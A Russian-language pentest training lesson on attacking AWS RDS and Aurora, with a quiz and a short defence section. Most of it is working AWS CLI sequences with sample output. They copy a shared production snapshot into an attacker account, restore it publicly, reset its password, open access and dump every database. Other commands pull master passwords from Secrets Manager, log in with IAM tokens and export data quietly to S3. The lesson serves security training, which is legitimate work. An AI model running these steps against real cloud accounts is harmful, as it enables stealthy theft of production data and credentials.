---
id: cloud-rds-aurora
title: "RDS и Aurora: публичный доступ, снапшоты и IAM-аутентификация"
category: cloud
parent: cloud-aws-data-deep
difficulty: hard
order: 3
tags: [cloud, aws, rds, aurora, snapshot, iam-auth, database, privesc]
prerequisites: [cloud-aws-data-deep, cloud-storage-s3]
useful_for:
  - "Пентест управляемых баз AWS"
  - "Извлечение данных из снапшотов"
  - "Использование IAM-аутентификации в БД"
estimated_minutes: 45
summary: "RDS/Aurora: публичная доступность, снапшоты как канал утечки, IAM database authentication и чтение мастер-паролей из Secrets Manager/SSM."
---

## Зачем этот урок

Управляемые базы AWS (RDS и Aurora) держат основную массу корпоративных данных: пользователей, заказы, токены, иногда пароли к другим сервисам. В быстрых пентестах их часто пропускают, потому что «в базе нет интернета». На практике есть минимум пять способов добраться до данных без прямого доступа к порту 3306/5432: публично доступный инстанс, расшаренный снапшот, чтение мастер-пароля из Secrets Manager/SSM, слабая IAM-аутентификация и восстановление из экспортированного снапшота в S3.

## Модель сервиса и поверхность атаки

RDS — управляемый сервис: вы не видите ОС, но управляете параметрами, сетью, снапшотами и аутентификацией. Aurora — совместимая с MySQL/PostgreSQL кластерная база с отдельным storage-слоем и read replicas. Ключевые сущности:

- **DB instance / cluster** — вычислительный узел с endpoint.
- **Subnet group + security group** — определяют сетевую доступность.
- **Snapshot (manual/automated)** — побайтовая копия, которую можно шарить и восстанавливать.
- **Parameter group** — настройки движка (включая `rds.force_ssl`, логирование).
- **IAM database authentication** — вход в БД токеном вместо пароля.

Поверхность атаки — API-вызовы: `rds:CreateDBSnapshot`, `rds:ModifyDBSnapshotAttribute`, `rds:RestoreDBInstanceFromDBSnapshot`, `rds:ModifyDBInstance` (смена SG), `rds-db:connect` (IAM-вход).

## Инструменты и команды

Основной инструмент — AWS CLI, плюс `psql`/`mysql` для подключения и `rdsutil`/`aws` для снапшотов.

```bash
# Кто мы и какие права есть
aws sts get-caller-identity
aws iam list-attached-user-policies --user-name "$USER"

# Инвентаризация инстансов и кластеров
aws rds describe-db-instances --query 'DBInstances[].{ID:DBInstanceIdentifier,Engine:Engine,Public:PubliclyAccessible,Endpoint:Endpoint.Address}' --output table
aws rds describe-db-clusters --query 'DBClusters[].{ID:DBClusterIdentifier,Engine:Engine,Endpoint:Endpoint}' --output table

# Снапшоты: свои, публичные и расшаренные
aws rds describe-db-snapshots --snapshot-type manual --query 'DBSnapshots[].{ID:DBSnapshotIdentifier,Enc:Encrypted,Engine:Engine}' --output table
aws rds describe-db-snapshots --snapshot-type public --region us-east-1 --query 'DBSnapshots[].DBSnapshotIdentifier'
aws rds describe-db-snapshots --snapshot-type shared --query 'DBSnapshots[].DBSnapshotIdentifier'

# Атрибуты снапшота (кому расшарен)
aws rds describe-db-snapshot-attributes --db-snapshot-identifier target-snap

# Мастер-пароль, если хранится в Secrets Manager
aws secretsmanager list-secrets --query 'SecretList[].Name'
aws secretsmanager get-secret-value --secret-id rds!db-xxxx --query SecretString --output text
```

Для IAM-аутентификации токен генерируется на лету и живёт 15 минут:

```bash
TOKEN=$(aws rds generate-db-auth-token \
  --hostname mydb.abc123.us-east-1.rds.amazonaws.com \
  --port 3306 --username admin --region us-east-1)
mysql -h mydb.abc123.us-east-1.rds.amazonaws.com -u admin -p"$TOKEN" --enable-cleartext-plugin
```

## Разобранный пример: расшаренный снапшот → полный дамп

Сценарий: у нас есть `rds:DescribeDBSnapshots`, `rds:RestoreDBInstanceFromDBSnapshot` и `rds:ModifyDBSnapshotAttribute`. Свой снапшот расшарен на внешний аккаунт — атакующий в этом аккаунте может скопировать его к себе.

```bash
# 1. Находим снапшот, расшаренный на наш аккаунт
aws rds describe-db-snapshots --snapshot-type shared \
  --query 'DBSnapshots[].{ID:DBSnapshotIdentifier,Enc:Encrypted}' --output table
# ID                Enc
# prod-db-snap      False

# 2. Копируем снапшот в свой аккаунт (свой KMS-ключ, если зашифрован)
aws rds copy-db-snapshot --source-db-snapshot-identifier arn:aws:rds:us-east-1:111122223333:snapshot:prod-db-snap \
  --target-db-snapshot-identifier stolen-snap --region us-east-1
# {"DBSnapshot": {"DBSnapshotIdentifier": "stolen-snap", "Status": "creating", ...}}

# 3. Ждём available и восстанавливаем инстанс под своим контролем
aws rds wait db-snapshot-completed --db-snapshot-identifier stolen-snap
aws rds restore-db-instance-from-db-snapshot \
  --db-instance-identifier stolen-db \
  --db-snapshot-identifier stolen-snap \
  --db-instance-class db.t3.medium --publicly-accessible
# {"DBInstance": {"DBInstanceStatus": "creating", "Endpoint": {"Address": "stolen-db....rds.amazonaws.com"}}}

# 4. Меняем мастер-пароль и открываем SG для себя
aws rds modify-db-instance --db-instance-identifier stolen-db \
  --master-user-password 'Pwn3d!Passw0rd' --apply-immediately
aws ec2 authorize-security-group-ingress --group-id sg-0abc \
  --protocol tcp --port 3306 --cidr 203.0.113.10/32

# 5. Подключаемся и дампим
mysqldump -h stolen-db.abc123.us-east-1.rds.amazonaws.com -u admin -p'Pwn3d!Passw0rd' --all-databases > dump.sql
```

Результат: полная копия прод-БД в нашем аккаунте, без единого касания прод-инстанса и без записи в его логи.

## Чек-лист атаки

1. `describe-db-instances` — ищем `PubliclyAccessible: true` и открытые SG.
2. `describe-db-snapshots --snapshot-type public|shared` — ищем расшаренные снапшоты.
3. Проверяем `Encrypted`: незашифрованные копируются без KMS-ограничений.
4. Secrets Manager / SSM: ищем `rds!db-*` и `/rds/*` параметры.
5. Проверяем `rds-db:connect` и IAM-аутентификацию: иногда пароль вообще не нужен.
6. `describe-db-proxy` и `describe-db-proxies` — прокси иногда обходит сетевые ограничения.

## Обход защит и edge cases

- **Шифрование снапшота.** Зашифрованный снапшот нельзя скопировать без прав на KMS-ключ. Обход: искать снапшот, зашифрованный `aws/rds` (managed key) — если у вас есть `kms:CreateGrant` через RDS, иногда работает `CopyDBSnapshot` с `--kms-key-id`. Иначе ищем незашифрованный.
- **Private subnet.** Публичный снапшот можно восстановить в своей VPC — сетевые ограничения прод-аккаунта не помеха.
- **IAM database auth.** Если у роли есть `rds-db:connect`, вход возможен без пароля; проверяйте `--enable-cleartext-plugin` (MySQL) и `sslrootcert` (PostgreSQL).
- **Export to S3.** `start-export-task` выгружает снапшот в S3 в Parquet — читайте через Athena.
- **Логи.** `describe-db-log-files` + `download-db-log-file-portion` могут содержать ошибки с логинами.

## Частые ошибки и подводные камни

- Пытаться подобрать пароль к публичному RDS — долго и шумно; снапшот быстрее.
- Забыть, что `ModifyDBInstance` перезагружает инстанс (downtime) — риск обрушить прод.
- Игнорировать `DeletionProtection` при экспериментах.
- Считать, что отсутствие публичного инстанса = нет данных: снапшоты и S3-экспорты часто забыты.
- Не проверить регион: снапшоты и инстансы живут в конкретном регионе.

## Защита и детект

- Включить шифрование по умолчанию (`rds.force_ssl`, KMS-CMK для снапшотов).
- Запретить публичные снапшоты через SCP и Config-правило `rds-snapshots-public-prohibited`.
- GuardDuty RDS Protection ловит подозрительные входы; CloudTrail пишет `CopyDBSnapshot`/`RestoreDBInstanceFromDBSnapshot`.
- Не хранить мастер-пароль в открытых SSM-параметрах; использовать IAM-аутентификацию и Secrets Manager с ограниченной ролью.

## Что дальше / решение

Из RDS-дамп обычно достаются пользователи, хеши, токены и внутренние креды. Следующий шаг — использовать найденные секреты для доступа к другим сервисам (DynamoDB, S3, API). Если снапшот зашифрован и KMS недоступен — зафиксируйте вектор как `blocked` с условием «нужен kms:Decrypt» и переходите к IAM-аутентификации. Записывайте путь «снапшот → восстановление → дамп» в граф атаки как lateral movement.

## Разобранный пример 2: IAM-аутентификация без пароля

Если у роли есть `rds-db:connect`, пароль вообще не нужен: клиент генерирует подписанный SigV4-токен и использует его как пароль. Токен живёт 15 минут и привязан к `hostname`, `port`, `username` и региону.

```bash
# Включена ли IAM-аутентификация на инстансе
aws rds describe-db-instances --db-instance-identifier prod-db \
  --query 'DBInstances[0].IAMDatabaseAuthenticationEnabled'
# true

# Разрешает ли наша роль rds-db:connect к конкретному пользователю
aws iam simulate-principal-policy \
  --policy-source-arn arn:aws:iam::111122223333:role/app \
  --action-names rds-db:connect \
  --resource-arns arn:aws:rds-db:us-east-1:111122223333:dbuser:db-ABC123/prod_user
# {"EvaluationResults": [{"EvalActionName": "rds-db:connect", "EvalDecision": "allowed"}]}

# PostgreSQL: токен идёт как пароль, обязателен TLS
TOKEN=$(aws rds generate-db-auth-token --hostname prod-db.abc.rds.amazonaws.com \
  --port 5432 --username prod_user --region us-east-1)
PGPASSWORD="$TOKEN" psql "host=prod-db.abc.rds.amazonaws.com port=5432 dbname=app user=prod_user sslmode=require"
# app=>

# MySQL: токен отправляется в cleartext, нужен TLS и --enable-cleartext-plugin
mysql -h prod-db.abc.rds.amazonaws.com -u prod_user -p"$TOKEN" --enable-cleartext-plugin
```

Ключевая деталь: база должна быть настроена под IAM. В MySQL пользователь создаётся с плагином `AWSAuthenticationPlugin`, в PostgreSQL — ролью `rds_iam`. Если админ забыл выдать `GRANT rds_iam`, вход не пройдёт, но сама попытка видна в логах движка. Для атакующего это значит: одна `rds-db:connect` без утечки пароля = вход в прод.

## Aurora-специфика: кластеры, reader endpoints и клоны

Aurora — это кластер, а не одиночный инстанс. У него есть writer endpoint (запись) и reader endpoint (балансировка чтения). Полезные для пентеста особенности:

- **Clone (copy-on-write).** `restore-db-cluster-to-point-in-time --restore-type copy-on-write` создаёт быстрый клон, разделяющий storage с источником. Это дешёвый и быстрый способ получить копию данных, не копируя терабайты.
- **Global Database.** Вторичные регионы содержат реплику; в них могут быть слабее логирование и IAM-политики. Проверяйте `describe-global-clusters`.
- **Backtrack (Aurora MySQL).** Откат кластера назад во времени «на месте». Операция потенциально разрушительна — не применять на проде без явного разрешения.
- **Serverless v2.** Автомасштабируемый кластер; scaling-события создают шум в логах, что полезно учитывать для OPSEC.

```bash
aws rds describe-db-clusters --query 'DBClusters[].{ID:DBClusterIdentifier,Engine:Engine,Members:DBClusterMembers[].DBInstanceIdentifier}' --output json
aws rds create-db-cluster-snapshot --db-cluster-identifier aurora-prod --db-cluster-snapshot-identifier aurora-clone-snap
```

## Практическое задание

1. В тестовом аккаунте создайте RDS-инстанс и ручной снапшот; расшарьте снапшот на второй аккаунт через `modify-db-snapshot-attribute`.
2. Из второго аккаунта скопируйте и восстановите снапшот, подключитесь и убедитесь, что данные доступны.
3. Включите `IAMDatabaseAuthenticationEnabled` и войдите, сгенерировав токен; проверьте обе СУБД (MySQL и PostgreSQL).
4. Включите Config-правило `rds-snapshots-public-prohibited` и убедитесь, что публичный снапшот помечается как non-compliant.

## Таблица «сценарий → API → результат»

| Сценарий | API-вызов | Что получаем |
|---|---|---|
| Расшаренный снапшот | `CopyDBSnapshot` + `RestoreDBInstanceFromDBSnapshot` | Полный дамп БД |
| Публичный снапшот | `RestoreDBInstanceFromDBSnapshot` | Дамп в своей VPC |
| Пароль в Secrets Manager | `secretsmanager:GetSecretValue` | Мастер-пароль |
| IAM-аутентификация | `rds-db:connect` + `generate-db-auth-token` | Вход без пароля |
| Тихий экспорт | `StartExportTask` в S3 | Данные в Parquet |
| Клон Aurora | `RestoreDBClusterToPointInTime` (copy-on-write) | Быстрая копия кластера |

## Квиз

```quiz
- question: "Какой вызов чаще всего позволяет получить данные RDS без доступа к порту?"
  options:
    - "RestoreDBInstanceFromDBSnapshot / CopyDBSnapshot расшаренного снапшота"
    - "ModifyDBInstance"
    - "RebootDBInstance"
    - "DescribeDBLogFiles"
  answer: 0
  explanation: "Снапшот копируется в свой аккаунт и восстанавливается подконтрольным инстансом."
- question: "Что мешает скопировать зашифрованный снапшот в чужой аккаунт?"
  options:
    - "Нужны права на KMS-ключ, которым он зашифрован"
    - "Он удаляется через час"
    - "Он только для чтения"
    - "Его нельзя восстановить"
  answer: 0
  explanation: "KMS-ключ не шарится автоматически вместе со снапшотом."
- question: "Зачем атакующему rds-db:connect?"
  options:
    - "Позволяет войти в БД с IAM-токеном вместо пароля"
    - "Даёт доступ к CloudTrail"
    - "Удаляет снапшоты"
    - "Меняет регион"
  answer: 0
  explanation: "IAM database authentication принимает короткоживущий токен, сгенерированный generate-db-auth-token."
- question: "Куда можно выгрузить снапшот для чтения без восстановления инстанса?"
  options:
    - "В S3 через start-export-task и читать через Athena"
    - "В DynamoDB"
    - "В Route 53"
    - "В CloudFront"
  answer: 0
  explanation: "Экспорт снапшота в S3 в формате Parquet даёт прямой доступ к данным."
```

## Где пригодится

- **Пентест AWS:** получение данных и кредов из управляемых БД.
- **Red team:** тихая эксфильтрация через снапшоты.
- **Cloud IR:** анализ экспортированных снапшотов.
- **Сертификация:** AWS Security — Specialty.
